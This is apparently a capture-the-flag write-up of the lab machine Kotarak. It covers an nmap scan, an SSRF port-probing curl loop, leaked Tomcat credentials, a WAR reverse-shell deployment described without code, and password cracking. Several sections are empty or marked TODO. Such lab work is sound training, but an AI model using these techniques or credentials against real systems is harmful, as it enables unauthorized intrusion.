# Kotarak (`10.10.10.55`)

## Summary

## `/etc/hosts`

I begin by adding an entry in `/etc/hosts` to resolve `kotarak.htb` to `10.10.10.55`. I use this later in my report.

## Enumeration

I start a portscan of all ports (`-p-`), running OS, service version, and vulnerability scripts (`-A`), skipping host discovery (`-Pn`), with verbose logging (`-v`) and output to a file (`-oN`).

```bash
$ nmap -A -v -p- -Pn -oN allports kotarak.htb
# Nmap 7.80 scan initiated Sun Sep 13 21:25:38 2020 as: nmap -A -sVC -v -p- -Pn -oA allports kotarak.htb
Nmap scan report for kotarak.htb (10.10.10.55)
Host is up (0.044s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp  open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=9/13%OT=22%CT=1%CU=41625%PV=Y%DS=2%DC=T%G=Y%TM=5F5ED67
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:06%GCD=1%ISR=10E%TI=Z%TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT1
OS:1NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=71
OS:20%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W
OS:=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.003 days (since Sun Sep 13 21:29:16 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   40.76 ms 10.10.14.1
2   40.80 ms kotarak.htb (10.10.10.55)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 13 21:33:20 2020 -- 1 IP address (1 host up) scanned in 461.79 seconds

```

The current attack surface is:

- Port 8080: Apache Tomcat 8.5.5

### Enumerate Port 60000

`$ for i in $(seq 0 1000); do echo "$i: "; curl -s http://kotarak.htb:60000/url.php?path=localhost:$i ; done`

![](img/2020-09-14-04-25-04.png)

I find credentials for `Tomcat`: `admin:3@g01PdhB!`.

Log in on port 8080.

![](img/2020-09-14-04-26-06.png)

Upload and deploy a WAR reverse shell and you've got your shell.

![](img/2020-09-14-04-27-47.png)

![](img/2020-09-14-04-27-56.png)

## Privilege Escalation to `atanas`

![](img/2020-09-14-06-11-14.png)

![](img/2020-09-14-06-38-40.png)

![](img/2020-09-14-06-38-51.png)

![](img/2020-09-14-06-39-07.png)

![](img/2020-09-14-06-41-23.png)

`Administrator:f16tomcat!` is a cracked set of credentials, but I'm really interested in the `atanas` creds. `john` stumbled with cracking them, but `Crackstation` takes care of it easily.

![](img/2020-09-14-06-43-02.png)

Turns out, I really did care about the `Administrator` one.

![](img/2020-09-14-06-45-49.png)

## Privilege Escalation to `root`

![](img/2020-09-14-20-43-14.png)

TODO: Root it with `$ searchsploit -m linux/remote/40064.txt` but I can't get it to work. So we're moving on.

## Proof

> `> type "C:\Users\Administrator\Desktop\proof.txt" && whoami && ipconfig`
> `> type "C:\Documents and Settings\Administrator\Desktop\proof.txt" && whoami && ipconfig`
> `$ cat /root/proof.txt && whoami && /sbin/ifconfig`

## Post Exploitation

## Clean Up

## Remediation

In order to remediate these issues, I suggest:

-
